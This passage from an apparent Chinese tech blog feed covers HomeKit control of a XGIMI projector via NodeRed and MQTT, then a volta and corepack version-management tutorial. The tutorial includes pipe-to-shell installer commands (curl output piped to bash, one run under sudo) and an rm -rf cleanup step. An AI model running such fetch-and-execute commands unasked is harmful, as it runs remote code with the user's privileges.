src="https://s2.loli.net/2023/07/20/raRAj6NfPQnl8C3.png" alt="image.png"></p><p>平台也有了，那么就要思考如何让 HomeAssistant 调用 NodeRed 的服务，最简单的方式就是使用 MQTT 协议来调用我们写的 NodeRed 服务。MQTT 是一个物联网领域的常用通信协议（可以不用深入了解），HomeAssistant 支持 MQTT 消息的发布(<a href="https://www.home-assistant.io/integrations/mqtt/">通过 MQTT 插件</a>)，而 NodeRed 支持 MQTT 消息的接收（当然也支持发布），这样 HomeAssistant 和 NodeRed 之间就可以互动了，比如让 HomeAssistant 发送 MQTT 指令触发 NodeRed 的 udp 节点发送一个 udp 请求，进而让极米投影仪执行指令对应的行为。到这一步，其实已经可以通过编写一个 HomeAssistant MQTT 控件以及对应的 NodeRed 的服务来实现 HomeAssistant 控制极米投影仪了。</p><p>但是我们最终的目的是将极米投影仪接入 HomeKit 生态，NodeRed 其中一个强大之处就是支持安装第三方插件，从而获得更多类型的控制节点，社区中有 HomeKit 服务相关的节点，可以帮助我们创建一个虚拟的 HomeKit 配件，我们使用家庭 APP 连接到这个虚拟配件后，当我们对这个虚拟配件进行操作时，NodeRed 中该 HomeKit 服务节点就会获得一个输入信号，那么我们只要将这个输入信号进行编码，让其发送对应的 udp 数据包到投影仪上，那么就可以实现 HomeKit 控制投影仪的功能。</p><p>最后还有一个开关机的难题，因为关机后设备处于离线状态，那么就无法跟设备通信了，就没法开机了。对于极米投影仪的解决方案是可以使用一个小米智能插座来解决，因为极米投影仪的高级设置中支持通电自动开机，那么只需要在收到关机指令后等待投影仪关机完成，插座自动断电，当收到开机指令时，插座再通电即可实现设备的唤醒。</p><h1 id="2-具体实现"><a href="#2-具体实现" class="headerlink" title="2. 具体实现"></a>2. 具体实现</h1><p> 整套服务的整体架构图如下：</p><p><img src="https://s2.loli.net/2023/07/20/pELi52doCvuzHFg.png" alt=""></p><p>这套架构的核心是在 NodeRed 平台上实现的 MQTT 服务，MQTT 服务不用考虑上游的实现，只专注实于现接收到 MQTT 消息时如何处理消息，如果是上下左右、调节音量等指令，那么就创建一个 UDP 报文，发送给设备端。但如果是开关机指令，则需要通过 MQTT 服务与 HomeAssistant 服务进行通信，请求关闭或开启小米智能插座。</p><p> 而 MQTT 服务的上游可以是多种的，比如 HomeAssistant 发来的 MQTT 消息（这个我们不做实现），还有就是我们后面需要使用 NodeRed 搭建的 HomeKit 服务发来的 MQTT 消息。如果你还想用其他方式来创建投影仪的控制器，你都可以自行实现，但只要控制器的输出是一个约定好的 MQTT 消息，那么就能通过核心的 MQTT 服务来对投影仪进行操作。</p><h2 id="2-1-MQTT-服务搭建"><a href="#2-1-MQTT-服务搭建" class="headerlink" title="2.1 MQTT 服务搭建"></a>2.1 MQTT 服务搭建</h2><p>首先要在系统中安装 MQTT 服务，否则一切都白搭，可以按照 <a href="https://www.jianshu.com/p/a13e888c93fb">这个教程</a> 来安装 MQTT 服务。</p><p>安装完成后，在 NodeRed 平台导入如下配置：</p><p><a href="https://gist.githubusercontent.com/EsunR/ec2ea06ef4768b3ddaf2d74fe9ff22f3/raw/mqtt-service.json">MQTT 服务</a></p><blockquote><p>导入方式：NodeRed 右上角菜单 - 导入 - 粘贴链接中的配置</p></blockquote><p>导入成功后会出现如下的流程图：</p><p><img src="https://s2.loli.net/2023/07/20/hsczo91td82QpIW.png" alt=""></p><p>导入完成以后需要修改一下『极米控制指令广播』这个节点，将发送 UDP 报文的目标地址需要修改为你投影仪的局域网 IP：</p><blockquote><p>这里请务必将投影仪的 IP 在路由器中设置为一个固定的静态 IP，否则每次开机都可能改变</p></blockquote><p><img src="https://s2.loli.net/2023/07/20/49fPby7OMtNgG3Z.png" alt=""></p><p>然后点击『部署』按钮部署节点。</p><p>为了让该服务可以控制投影仪插座，你需要将小米智能插座接入到 HomeAssistant 后，创建两个 HomeAssistant 的自动化，分别控制插座的开关，自动化的触发条件要设置为接收到 MQTT 消息。</p><p>收到投影仪关机 MQTT：</p><p><img src="https://s2.loli.net/2023/07/20/uiIWJS3G5m91DsK.png" alt=""></p><p>收到投影仪开机 MQTT：</p><p><img src="https://s2.loli.net/2023/07/20/eE4uYMir3tAlRGF.png" alt=""></p><h2 id="2-2-HomeKit-服务搭建"><a href="#2-2-HomeKit-服务搭建" class="headerlink" title="2.2 HomeKit 服务搭建"></a>2.2 HomeKit 服务搭建</h2><p>首先点击右上角菜单，选择『节点管理』，点击安装面板，分别安装 <code>node-red-contrib-homekit-bridged</code> 和 <code>node-red-node-ping</code> 这两个节点插件（需要设备科学上网环境，否则可能会安装失败），然后导入如下配置：</p><p><a href="https://gist.githubusercontent.com/EsunR/ec2ea06ef4768b3ddaf2d74fe9ff22f3/raw/homekit-service.json">HomeKit 服务</a></p><p><img src="https://s2.loli.net/2023/07/20/nIgavwc246BdlCQ.png" alt=""></p><p>这个配置无需修改，成功部署后直接在家庭 APP 中搜索设备即可查找到创建的投影仪设备，配对码即为 HomeKit 节点下显示的数字，如果想要修改虚拟 HomeKit 设备信息，则选中 HomeKit 服务节点，选择新增 homekit-standalone 节点后填写入信息即可。</p><p><img src="https://s2.loli.net/2023/07/20/ls6cigDb2ZH1MOu.png" alt=""></p><blockquote><p>如果查找不到，可能是科学上网的问题，暂时关闭试试。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HomeAssistant </tag>
            
            <tag> HomeKit </tag>
            
            <tag> 极米投影仪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 volta 与 corepack 规范团队在不同项目中使用的 node 版本与 npm 包管理器</title>
      <link href="/2023/07/d99593770741.html"/>
      <url>/2023/07/d99593770741.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><p>在前端开发团队中，经常存在多个新老项目同时开发的情况，这些项目他们的 node 版本可能不一样，项目中所使用的包管理器也不一样。比如一些老的项目可能使用低版本 node 并使用 npm 安装项目依赖，而一些新的项目则会使用高版本 node 与 pnpm/yarn 来安装项目依赖。</p><p>如果 node 版本不统一，带来的问题可能就是整个项目无法运行；而如果包管理器不统一，带来的则可能是 <code>package-lock.json</code>、<code>yarn.lock</code>、<code>pnpm-lock.yaml</code> 在每个成员电脑上都不一致的灾难。</p><blockquote><p>之所以是灾难，因为很多项目本地明明运行的好好的，然而在其他人电脑上或者线上却无法正常运行，这都很有可能是因为 lock 文件没有对其导致安装了错误版本的依赖包！</p></blockquote><p>为了解决这个问题，本文将向你展示如何使用 volta 来管理 node 版本，并用 corepack 来管理包管理器，团队只需要准备相同的环境，对当前的项目进行简单改造，就可以实现在每个项目中自动切换 node 版本与包管理器版本！</p><h1 id="1-Volta"><a href="#1-Volta" class="headerlink" title="1. Volta"></a>1. Volta</h1><p>Volta 官网描述为一款无障碍的 JavaScript 工具管理器，与 nvm、n 类似的，可以用来管理 Node 版本，但同时又有以下优势：</p><ul><li>可以根据项目 <code>package.json</code> 声明的 volta 配置来根据不同的项目自动切换 node 版本；</li><li>volta 也可以直接管理 pnpm 与 yarn（不推荐，建议如果使用高版本的node，使用后面的 corepack 来管理包管理器）；</li><li>当使用 volta 安装的 node 来执行全局安装时，切换 node 版本后，全局安装的包仍然存在，并且其运行时所依赖的 node 版本会被固定为安装该包时使用的 node 版本；</li></ul><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><p>volta 安装只需要执行一行命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.volta.sh | bash</span><br></pre></td></tr></table></figure><p>之后便可以使用 volta 来安装不通版本的 node：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volta install node@18</span><br></pre></td></tr></table></figure><blockquote><p>若想要切换 node 版本，也只需使用 <code>volta install</code> 指令即可</p></blockquote><p>你可以使用 <code>volta list all</code> 查看当前 volta 所已经安装的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">User toolchain:</span><br><span class="line"></span><br><span class="line">    Node runtimes:</span><br><span class="line">        v14.21.3 (default)</span><br><span class="line">        v16.20.1</span><br><span class="line">        v18.16.1</span><br><span class="line">        v20.3.1</span><br><span class="line"></span><br><span class="line">    Package managers:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Packages:</span><br><span class="line">        serve@14.2.0 (default)</span><br><span class="line">            binary tools: serve</span><br><span class="line">            platform:</span><br><span class="line">                runtime: node@14.21.3</span><br><span class="line">                package manager: npm@built-in</span><br></pre></td></tr></table></figure><p>这些内容分为三部分：</p><ul><li>Node runtimes：你已经安装的 node 版本，显示 default 即为你当前全局使用的 node 版本；</li><li>Package managers：你已经安装的包管理器（这一部分的管理与 corepack 冲突，后面再具体讨论）；</li><li>Packages：使用 <code>npm install --global</code> 安装的全局包，volta 会在此列出，并固定其运行时版本；</li></ul><h2 id="1-2-使用-volta-管理项目依赖的-node"><a href="#1-2-使用-volta-管理项目依赖的-node" class="headerlink" title="1.2 使用 volta 管理项目依赖的 node"></a>1.2 使用 volta 管理项目依赖的 node</h2><p>假如你之前使用的是 nvm，如果你想要为不通的项目来规范 node 版本，那么需要在项目目录通过创建 <code>.nvmrc</code> 写入 node 版本，并要求开发者在进入项目时使用 <code>nvm use</code> 来对其当前使用的 node 版本。这个操作如果想要自动化，就需要编写一个自动化脚本来实现（<a href="https://stackoverflow.com/questions/57110542/how-to-write-a-nvmrc-file-which-automatically-change-node-version">参考</a>）。</p><p>但是对于 volta 来说，这个步骤是及其简单并且完全自动化的。当要求全团队使用 volta 后，可以直接在项目目录（package.json 的目录下）使用如下指令，将当前项目所使用的 node 版本固定为 node v18 的 LTS 版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volta pin node@18</span><br></pre></td></tr></table></figure><p>之后，你就会发现项目的 package.json 中被添加上一段：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;volta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18.16.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>之后当用户进入到当前项目中时，volta 就会检测到 package.json 中声明的 node 版本，并且切换至该 node 版本。</p><h2 id="1-3-volta-卸载不使用的-node-和包管理器"><a href="#1-3-volta-卸载不使用的-node-和包管理器" class="headerlink" title="1.3 volta 卸载不使用的 node 和包管理器"></a>1.3 volta 卸载不使用的 node 和包管理器</h2><p>当你尝试使用 <code>volta uninstall yarn</code> 或者 <code>volta uninstall node</code> 时，会出现暂无法支持卸载的提示：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Uninstalling node is not supported yet.</span><br></pre></td></tr></table></figure><p>因此需要到 <code>~/.volta/tools/image</code> 手动删除已经下载的 npm 或者 yarn 等，<a href="https://github.com/volta-cli/volta/issues/1431#issuecomment-1409424063">参考</a>。</p><h2 id="1-4-volta-对于二进制包的管理"><a href="#1-4-volta-对于二进制包的管理" class="headerlink" title="1.4 volta 对于二进制包的管理"></a>1.4 volta 对于二进制包的管理</h2><p>在使用 npm 全局安装二进制包时，如 <code>npm install pm2</code>（或 <code>votla install pm2</code>），volta 为了保证在切换 node 版本后这些二进制包仍能够使用，volta 会固定其依赖的 node 版本为其安装时 volta 设置的默认 node 版本。</p><p>如果想要指定 volta 对于安装二进制包时锁定的 node 版本依赖，可以在安装时修改 volta 的默认 node 版本号，或者使用 <code>volta run</code> 指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volta run --node 14 npm i -g pm2</span><br></pre></td></tr></table></figure><p>如果要想查看系统内安装的 npm 二进制包所依赖的具体 node 版本号，可以使用 <code>volta list all</code> 查看：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">volta list all</span><br><span class="line"></span><br><span class="line">⚡️ User toolchain:</span><br><span class="line"></span><br><span class="line">Node runtimes:</span><br><span class="line">v12.22.12</span><br><span class="line">v14.21.3</span><br><span class="line">v18.17.1 (default)</span><br><span class="line"></span><br><span class="line">Package managers:</span><br><span class="line">Yarn:</span><br><span class="line">v1.22.19</span><br><span class="line">v4.0.0-rc.48 (default)</span><br><span class="line"></span><br><span class="line">Packages:</span><br><span class="line">pm2@5.3.0 (default)</span><br><span class="line">binary tools: pm2, pm2-dev, pm2-docker, pm2-runtime</span><br><span class="line">platform:</span><br><span class="line">runtime: node@18.18.0</span><br><span class="line">package manager: npm@built-in</span><br><span class="line">serve@14.2.0 (default)</span><br><span class="line">binary tools: serve</span><br><span class="line">platform:</span><br><span class="line">runtime: node@14.21.3</span><br><span class="line">package manager: npm@built-in</span><br></pre></td></tr></table></figure><blockquote><p>PS：<code>volta list</code> 指令列出的 <code>Tool binaries available</code> 列表中包后面跟的 <code>(default)</code> 表示为工具本身的版本，而不是依赖的 node 版本。<a href="https://github.com/volta-cli/volta/issues/1226">Issues</a></p></blockquote><h2 id="1-5-volta-的原理"><a href="#1-5-volta-的原理" class="headerlink" title="1.5 volta 的原理"></a>1.5 volta 的原理</h2><p>volta 的原理并不复杂，本质上就是通过覆写二进制文件的执行指令到 volta 的处理程序中，然后 volta 就可以调用正确的 node 版本，或者调用全局安装的二进制文件并为其指定 node 版本。</p><p>我们可以使用 <code>which node</code> 来查看以下 node 的执行位置，会发现其执行位置为用户目录下的 <code>.volta/bin/node</code> 中。</p><p>我们在来查看一下全局安装的包，比如我们使用 <code>npm install serve -g</code> 安装的 <code>serve</code> 指令，调用 <code>which serve</code> 可以发现其执行位置同样为 <code>~/.volta/bin</code> 目录。</p><p>我们切换到该目录后，就可以查看到这些可执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node npm npx serve volta volta-migrate volta-shim</span><br></pre></td></tr></table></figure><p>可以发现，我们通过全局安装指令安装的二进制文件会被放到这个位置，node 和 npm 的执行文件也在这个位置。但实际上另有玄机，我们可以使用 <code>ls -l</code> 查看一下文件的详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total 37008</span><br><span class="line">lrwxr-xr-x  1 username  staff    39B Jul  4 14:49 node -&gt; /Users/username/.volta/bin/volta-shim</span><br><span class="line">lrwxr-xr-x  1 username  staff    39B Jul  4 14:49 npm -&gt; /Users/username/.volta/bin/volta-shim</span><br><span class="line">lrwxr-xr-x  1 username  staff    39B Jul  4 14:49 npx -&gt; /Users/username/.volta/bin/volta-shim</span><br><span class="line">lrwxr-xr-x  1 username  staff    39B Jul  5 19:12 serve -&gt; /Users/username/.volta/bin/volta-shim</span><br><span class="line">-rwxr-xr-x  1 username  staff   7.3M Jan 25 05:38 volta</span><br><span class="line">-rwxr-xr-x  1 username  staff   4.4M Jan 25 05:37 volta-migrate</span><br><span class="line">-rwxr-xr-x  1 username  staff   6.4M Jan 25 05:37 volta-shim</span><br></pre></td></tr></table></figure><p>这些可执行的二进制文件都被使用连接符软连接到了 <code>volta-shim</code> 这个可执行文件上去。</p><p>因此 volta 背后自动切换 node 版本以及管理全局包的魔法实际上就是：当使用 Volta 时，npm、node以及其他全局包的这些二进制文件被重定向到 <code>.volta/bin</code> 目录下的对应可执行文件，而这些可执行文件实际上都是 <code>.volta/bin/volta-shim</code> 所创建的软连接。 volta-shim 本身是一个特殊的脚本，他主要做了如下这些事情：</p><ul><li>如果是 node、npm、yarn 等指令，监测当前工作空间是否被 <code>volta pin</code> 指定了 node 版本和包管理器的版本，如果是，则将指令定向到目标版本；</li><li>如果是 serve 这种由 npm 安装的可执行文件，则定向到该可执行文件，并且<strong>使用安装该可执行文件时的 node 版本</strong> 来执行该指令。</li></ul><h1 id="2-Corepack"><a href="#2-Corepack" class="headerlink" title="2. Corepack"></a>2. Corepack</h1><blockquote><p>注意：corepack 只适用于 <a href="mailto:node@16.9.0">node@16.9.0</a> 以上的版本，如果你的团队 node 版本低于此版本，同时项目又使用了 yarn/pnpm 来进行包管理，那么使用 corepack 可能存在问题，可以考虑使用 volta 的包管理器的管理功能。如果非要使用，可以参考 3.3 节中的方案。</p></blockquote><p>corepack 是 node 官方出的一个管理 node 包管理器的管理器，其已经内置于 node@20 版本中，与 npm 一样作为被默认安装的指令工具，但默认没有被启用。</p><p>其诞生背景是因为 npm 本身的不思进取，导致社区出现了 yarn、pnpm 这些更优秀的包管理器工具，然而这些包管理器工具在不同的项目中又有可能使用不同的版本，因此规范项目中使用的包管理器也和规范项目所使用的 node 版本一样重要。</p><blockquote><p>毕竟在团队中，谁都不想 lock 文件在每个人的电脑上都有各自的版本！</p></blockquote><h2 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h2><p>如果你的团队使用的是 node@20，那么 corepack 指令则已经被默认安装。如果你是用的是其他版本的 node（最低 <a href="mailto:node@16.9.0">node@16.9.0</a>），则需要手动执行 <code>npm install corepack -g</code> 来安装。</p><p>安装后的 corepack 默认是被禁用的，如果你想要启用 corepack 则需要先卸载全局安装的包管理器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall yarn -g</span><br><span class="line">npm uninstall pnpm -g</span><br></pre></td></tr></table></figure><p>然后执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corepack <span class="built_in">enable</span></span><br><span class="line">corepack prepare --all</span><br></pre></td></tr></table></figure><p>首先，corepack 会被启用，在你的 <code>/usr/local/bin/</code> 目录下创建 pnpm、pnpx、yarn、yarnpkg 这几个可执行文件，让你可以使用 pnpm 和 yarn 的指令。实际上，这些指令也是一个软连接，会连接到 corepack 的处理程序（其实与 volta 的原理类似），以让 corepack 可以使用正确的包管理器版本；</p><p>之后使用 <code>corepack prepare --all</code> 指令会下载最新的 pnpm 和 yarn 的稳定版，此时你就可以正常在全局使用 yarn 和 pnpm 了。</p><p>如果你想切换全局安装的 pnpm 和 yarn，可以使用下面的指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将全局使用 pnpm 版本切换到 pnpm@6.35.1</span></span><br><span class="line">corepack prepare pnpm@6.35.1 --activate</span><br></pre></td></tr></table></figure><blockquote><p>注意：corepack 指定包管理器版本的时候必须使用 @x.y.x 来明确三位版本号</p></blockquote><h2 id="2-2-使用-corepack-管理项目使用的包管理器"><a href="#2-2-使用-corepack-管理项目使用的包管理器" class="headerlink" title="2.2 使用 corepack 管理项目使用的包管理器"></a>2.2 使用 corepack 管理项目使用的包管理器</h2><p>与 volta 类似的，corepack 也是通过识别项目 package.json 中声明的配置来自动切换包管理器的，但需要手动添加：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;packageManager&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pnpm@8.6.6&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样，就成功指定了项目使用的 pnpm 版本为 <code>8.6.6</code>，当我们使用 <code>pnpm</code> 指令的时候，corepack 会自动安装对应版本，并调用改版本。</p><p>此外，如果读取到有效的 packageManger 配置，corepack 还会阻止用户使用错误的包管理器来安装，比如如果用户在上面配置的项目中使用 <code>yarn install</code>，那么就会出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage Error: This project is configured to use pnpm</span><br><span class="line"></span><br><span class="line">$ yarn ...</span><br></pre></td></tr></table></figure><blockquote><p>corepack 默认不会托管 npm，也不建议这么做（因为 node 版本与 npm 版本已经强绑定了），因此不会拦截 <code>npm install</code> 的指令</p></blockquote><h1 id="3-Volta-与-Corepack-结合使用"><a href="#3-Volta-与-Corepack-结合使用" class="headerlink" title="3. Volta 与 Corepack 结合使用"></a>3. Volta 与 Corepack 结合使用</h1><h2 id="3-1-为什么非要使用-Corepack-？"><a href="#3-1-为什么非要使用-Corepack-？" class="headerlink" title="3.1 为什么非要使用 Corepack ？"></a>3.1 为什么非要使用 Corepack ？</h2><p>当你看到这里可能会有疑问，volta 本身是支持同时管理 node 与包管理器，但为什么还要使用 corepack？那么我只能说 <strong>volta 本身的包管理是有缺陷的，而 corepack 是未来</strong>。</p><p>使用 corepack 已经被 node 官方视为一个 <a href="https://nodejs.org/api/corepack.html"><strong>规范</strong></a>，已经集成在 Node 的最新发行版本中，目前完整的支持 yarn 和 pnpm 的切换，yarn 和 pnpm 在初始化项目的时候也会将 <code>packageManager</code> 写入到 package.json 中，corepack 必定是一个趋势。所以对于包管理器的管理来说，应当尽量使用 Corepack 而非 Volta。</p><p>综上，一个比较推荐的做法是：</p><ul><li>使用 volta 管理 node，以及全局安装的 npm 包</li><li>使用 corepack 管理包管理器</li></ul><h2 id="3-2-Volta-与-Corepack-之间的冲突问题"><a href="#3-2-Volta-与-Corepack-之间的冲突问题" class="headerlink" title="3.2 Volta 与 Corepack 之间的冲突问题"></a>3.2 Volta 与 Corepack 之间的冲突问题</h2><p>由于 volta 和 corepack 对于包管理器的管理都是基于 shim 的，也就是说他们都会拦截 yarn 以及 pnpm 指令，因此两个管理器之间存在冲突，你可以能会遇到以下问题：</p><ul><li>volta 安装了高版本 node，但是 corepack 指令无法使用；</li><li>使用 volta 管理的 node 进行全局安装 corepack，在使用 corepack 管理的 yarn/pnpm 执行 package.json 中的脚本时，node 版本也会被限制为 volta 锁定 corepack 时的版本；</li><li>通过其他途径安装了 corepack，但就是无法使用 corepack 管理的 yarn/pnpm，当使用 yarn 指令时，会出现 volta 的警告；</li></ul><p>要想解决这个问题，一定要遵循如下的原则：</p><ol><li>不要使用 volta 管理的 node 来全局安装 corepack</li><li>让 corepack 的 shim 覆盖掉 volta 的 shim</li></ol><p>以下以 MacOS 和 Ubuntu 来演示一下如何同时安装 volta 与 corepack 并解决其冲突：</p><h3 id="MacOS-的安装流程"><a href="#MacOS-的安装流程" class="headerlink" title="MacOS 的安装流程"></a>MacOS 的安装流程</h3><blockquote><p>前置条件：最好先卸载设备上所有的包管理器以及 node</p></blockquote><p>首先，如果安装了 volta，按照以下步骤 <a href="https://docs.volta.sh/advanced/uninstall">卸载 volta</a>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ~/.volta</span><br></pre></td></tr></table></figure><p>然后使用 homebrew 安装 corepack：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install corepack</span><br></pre></td></tr></table></figure><blockquote><p>由于 corepack 依赖 node，brew 会在你的电脑上安装 node@20，不过没关系，后续我们使用 volta 管理 node，安装的这个 node 不会被使用，也不会影响我们使用 volta 切换 node 版本</p></blockquote><p>测试一下 corepack 指令，并将其启用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corepack <span class="built_in">enable</span></span><br><span class="line">corepack prepare --all</span><br></pre></td></tr></table></figure><p>安装 volta：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.volta.sh | bash</span><br></pre></td></tr></table></figure><p>使用 volta 安装 node：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volta install node</span><br></pre></td></tr></table></figure><p>安装完 node 后可以检查一下 pnpm/yarn 指令是否被 volta 拦截：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> yarn</span><br><span class="line"><span class="comment"># 如果输出以下路径，说明正在使用 corepack 管理 yarn</span></span><br><span class="line">/usr/local/bin/yarn</span><br></pre></td></tr></table></figure><p>后续就不要使用 volta 安装任何包管理器，也不要执行 <code>npm install yarn -g</code> 或者 <code>npm install pnpm -g</code>，否则 corepack 可能失效。</p><blockquote><p>如果 corepack 失效，同时使用 <code>which yarn</code> 显示的 yarn 的执行文件在 <code>~/.volta/bin/yarn</code> 的位置，可以使用 <code>corepack enable --install-directory ~/.volta/bin</code>  来强行将 coreapck 的 shim 覆盖到 volta 的 shim 上。</p></blockquote><h3 id="Linux-的安装流程"><a href="#Linux-的安装流程" class="headerlink" title="Linux 的安装流程"></a>Linux 的安装流程</h3><p>同样的，在安装 corepack 前需要卸载 volta：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ~/.volta</span><br></pre></td></tr></table></figure><p>由于 Ubuntu 等 Linux 系统没有 homebrew，同时系统的安装源中也没有 corepack，所以我们要通过安装 node@20 的方式来安装 corepack，输入以下指令来添加 node@20 的安装源，并安装 node（其他 Linux 系统可以查看 <a href="https://github.com/nodesource/distributions#installation-instructions">这里</a>）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &amp;&amp;\</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure><p>测试一下 corepack 指令，并将其启用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corepack <span class="built_in">enable</span></span><br><span class="line">corepack prepare --all</span><br></pre></td></tr></table></figure><p>安装 volta：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.volta.sh | bash</span><br></pre></td></tr></table></figure><p>使用 volta 安装 node：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volta install node</span><br></pre></td></tr></table></figure><p>与 MacOS 不同的是，当你重启终端后会发现 corepack 失效了，具体的表现为，当你使用 <code>yarn -v</code> 时会出现如下提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Volta error: Yarn is not available.</span><br><span class="line"></span><br><span class="line">Use `volta install yarn` to select a default version (see `volta help install` for more info).</span><br></pre></td></tr></table></figure><p>可以使用 <code>which yarn</code> 来查看 yarn 的执行路径变为了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.volta/bin/yarn</span><br></pre></td></tr></table></figure><blockquote><p>在安装了 corepack 但未安装 volta 时，执行路径为 <code>/usr/bin/yarn</code></p></blockquote><p><strong>我们可以使用如下指令强行让 corepack 的 shim 覆盖掉 volta 的 shim：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">corepack <span class="built_in">enable</span> --install-directory ~/.volta/bin</span><br></pre></td></tr></table></figure><p>进入到 <code>~/.volta/bin</code> 目录下，使用 <code>ls -l</code> 指令，我们就会发现 volta 的 pnpm、yarn 相关的指令都被指向到了 corepack 的 shim：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root   51  7月  6 17:08 pnpm -&gt; ../../../usr/lib/node_modules/corepack/dist/pnpm.js</span><br><span class="line">lrwxrwxrwx 1 root root   51  7月  6 17:08 pnpx -&gt; ../../../usr/lib/node_modules/corepack/dist/pnpx.js</span><br><span 